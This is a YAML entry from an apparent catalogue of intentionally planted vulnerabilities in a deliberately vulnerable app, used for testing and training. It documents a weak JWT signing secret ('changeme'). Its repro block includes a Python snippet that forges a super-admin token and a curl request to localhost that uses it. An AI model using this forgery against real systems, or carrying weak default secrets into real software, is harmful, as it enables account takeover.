  - id: AUTH-JWT-001
    title: Weak HMAC signing secret enables Bearer-token forgery (no login)
    class: BrokenAuthentication
    cwe: CWE-321
    owasp: "API2:2023"
    tier: 1
    origin: api
    endpoint: "GET /api/me"   # representative; the weak key affects all Bearer-auth routes
    severity: Critical
    auth: none
    detector: diver_jwt_weak_secret
    deterministic: true
    # No per-endpoint secured twin: the weakness is a global signing-key config,
    # not an authz gap. The control (a wrong-secret token is rejected) lives in
    # the exploit test, proving verification happens and isolating the weak key.
    secured_twin: null
    intentional: true
    repro: |
      # The api signs/verifies HS256 with the guessable default secret "changeme"
      # (api/config.py). Forge a token for the super-admin (sub=5) and call the
      # api directly - no credentials, no web login:
      python - <<'PY'
      from jose import jwt
      print(jwt.encode({"sub": "5", "iss": "vulnforge-api"}, "changeme", algorithm="HS256"))
      PY
      curl http://localhost:8081/api/me -H "Authorization: Bearer <forged_token>"
      # -> 200 as superadmin@vulnforge.internal (isSuperAdmin=true).

